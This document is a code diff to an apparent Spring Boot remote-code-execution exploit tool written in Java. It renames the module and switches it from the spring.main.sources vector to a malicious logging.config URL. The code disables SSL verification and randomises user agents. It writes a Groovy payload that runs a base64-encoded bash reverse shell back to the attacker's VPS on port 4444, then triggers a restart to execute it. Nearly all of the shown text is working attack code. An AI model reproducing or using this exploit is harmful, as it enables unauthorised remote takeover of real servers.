@@ -3,7 +3,6 @@ package src.main.module;
 import src.main.common.UA_Config;
 import src.main.impl.ResultCallback;
 
-import javax.swing.text.html.HTML;
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -16,21 +15,21 @@ import java.util.regex.Pattern;
 
 import static src.main.SSLVerify.sslVer.disableSSLVerification;
 
-public class MainSourceGrooyRCE {
+public class LoggingGroovyRCE {
     private String address;
     private String vpsIP;
     private String vpsPORT;
     public String text;
-    public String expdata1 = "spring.main.sources=http://%s/MainSourceGR.groovy";
-    public String expdata2 = "{\"name\":\"spring.main.sources\",\"value\":\"http://%s/MainSourceGR.groovy\"}";
-    public String cmdtmp = "bash -i >&/dev/tcp/%s/7777 0>&1";
-//    bash -c {echo,%s}|{base64,-d}|{bash,-i}
+    public String expdata1 = "logging.config=http://%s/LoggingConfigGR.groovy";
+    public String expdata2 = "{\"name\":\"logging.config\",\"value\":\"http://%s/LoggingConfigGR.groovy\"}";
+    public String cmdtmp = "bash -i >&/dev/tcp/%s/4444 0>&1";
+    //    bash -c {echo,%s}|{base64,-d}|{bash,-i}
     public String payload = "Runtime.getRuntime().exec(\"bash -c {echo,%s}|{base64,-d}|{bash,-i}\");";
 //    public String pocstr1 = "Runtime.getRuntime().exec(\"curl %s?haha=123\");";
 //    public String pocstr2 = "Runtime.getRuntime().exec(\"open -a Calculator\");";
 
 
-    public MainSourceGrooyRCE(String address,String vpsIP, String vpsPORT){
+    public LoggingGroovyRCE(String address, String vpsIP, String vpsPORT){
         this.address = address;
         this.vpsIP = vpsIP;
         this.vpsPORT = vpsPORT;
@@ -45,12 +44,13 @@ public class MainSourceGrooyRCE {
         String ua = "";
         String data = "";
         disableSSLVerification();
-        data = String.format(expdata2, vpsIP + ":" + vpsPORT);
+        data = String.format(expdata1, vpsIP + ":" + vpsPORT);
         try {
             UA_Config uacf = new UA_Config();
             List<String> ualist = uacf.loadUserAgents();
             URL obj = new URL(site);
             HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+            ua = uacf.getRandomUserAgent(ualist);
             conn.setRequestProperty("User-Agent",ua);
             conn.setRequestMethod("GET");
             conn.setDoOutput(true);
@@ -135,6 +135,7 @@ public class MainSourceGrooyRCE {
             List<String> ualist = uacf.loadUserAgents();
             URL obj = new URL(site);
             HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+            ua = uacf.getRandomUserAgent(ualist);
             conn.setRequestProperty("User-Agent",ua);
             conn.setRequestMethod("GET");
             conn.setDoOutput(true);
@@ -163,15 +164,15 @@ public class MainSourceGrooyRCE {
                         String b64payload = Base64.getEncoder().encodeToString(String.format(cmdtmp,vpsIP).getBytes());
                         String exp = String.format(payload,b64payload);
                         try {
-                            FileWriter writer = new FileWriter(System.getProperty("user.dir") + "/resources/MainSourceGR.groovy");
+                            FileWriter writer = new FileWriter(System.getProperty("user.dir") + "/resources/LoggingConfigGR.groovy");
                             Scanner sc = new Scanner(System.in);
                             writer.write(exp);
                             sc.close();
                             writer.close();
-                            text = "MainSourceGR.groovy文件写入成功";
+                            text = "LoggingConfigGR.groovy文件写入成功";
                             callback.onResult(text);
                         }catch (IOException e){
-                            text = "MainSourceGR.groovy文件写入失败";
+                            text = "LoggingConfigGR.groovy文件写入失败";
                             callback.onResult(text);
                             e.printStackTrace();
                         }
@@ -193,7 +194,7 @@ public class MainSourceGrooyRCE {
                                 if (responseCode2 == HttpURLConnection.HTTP_OK) {
                                     text = "执行命令成功";
                                     callback.onResult(text);
-                                    text = "当前反弹vpsIP: " + vpsIP + "vpsPort: 7777";
+                                    text = "当前反弹vpsIP: " + vpsIP + "vpsPort: 4444";
                                     callback.onResult(text);
                                 } else {
                                     text = "错误：发送restart请求失败，状态码为: " + responseCode2;
